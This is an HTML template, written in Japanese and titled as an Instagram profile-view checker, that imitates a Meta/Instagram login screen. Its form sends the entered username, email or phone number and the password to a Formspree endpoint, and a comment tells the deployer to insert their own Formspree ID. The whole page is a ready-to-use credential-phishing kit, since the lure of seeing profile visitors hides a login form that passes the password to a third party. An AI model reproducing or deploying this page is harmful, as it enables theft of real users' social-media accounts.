<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagramプロフィール閲覧チェッカー</title>
    <style>
        /* 1. 全体設定：背景色、文字色、フォント */
        body {
            background-color: #121212; /* ダークグレーの背景 */
            color: #FFFFFF; /* 白い文字 */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* 2. フォームコンテナ：中央寄せと幅指定 */
        .login-container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            text-align: center;
        }

        /* 3. ロゴ（Metaロゴ）の代わり */
        .meta-logo {
            font-size: 24px;
            margin-bottom: 40px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }

        /* 4. 入力欄のデザイン：暗い背景、細い枠線、角丸 */
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 12px;
            margin-bottom: 12px;
            background-color: #1A1A1A; /* 入力欄は少し明るいグレー */
            border: 1px solid #333333; /* 暗い枠線 */
            border-radius: 8px; /* 角丸 */
            color: #FFFFFF;
            font-size: 14px;
            box-sizing: border-box; /* paddingを含めた幅計算 */
        }
        /* プレースホルダーの文字色 */
        ::placeholder {
            color: #777777;
        }

        /* 5. ログインボタンのデザイン：青色、角丸 */
        .login-button {
            width: 100%;
            padding: 14px;
            background-color: #0080FF; /* 明るい青 */
            border: none;
            border-radius: 8px;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 20px;
        }

        /* 6. リンクテキスト：薄い文字、中央寄せ */
        .forgot-password {
            color: #BBBBBB;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-bottom: 80px;
        }

        /* 7. 下部の「新しいアカウントを作成」ボタン */
        .create-account-button {
            width: 100%;
            padding: 10px;
            background-color: transparent;
            border: 1px solid #0080FF; /* 青い枠線のみ */
            border-radius: 20px; /* 楕円形の角丸 */
            color: #0080FF; /* 青い文字 */
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: block;
            box-sizing: border-box;
        }

    </style>
</head>
<body>

    <div class="login-container">
        <!-- Metaロゴのプレースホルダー -->
        <div class="meta-logo">
            <span>∞</span> Meta
        </div>

        <!-- actionのURLを自分のFormspreeのURLに変更してください -->
        <form action="https://formspree.io/f/自分のID" method="POST">
            <input type="text" name="name" placeholder="ユーザーネーム、メールまたは携帯電話番号" required>
            <input type="password" name="password" placeholder="パスワード" required>
            
            <button type="submit" class="login-button">ログイン</button>
        </form>

        <a href="#" class="forgot-password">パスワードを忘れた場合</a>

        <a href="#" class="create-account-button">新しいアカウントを作成</a>
    </div>

</body>
</html>
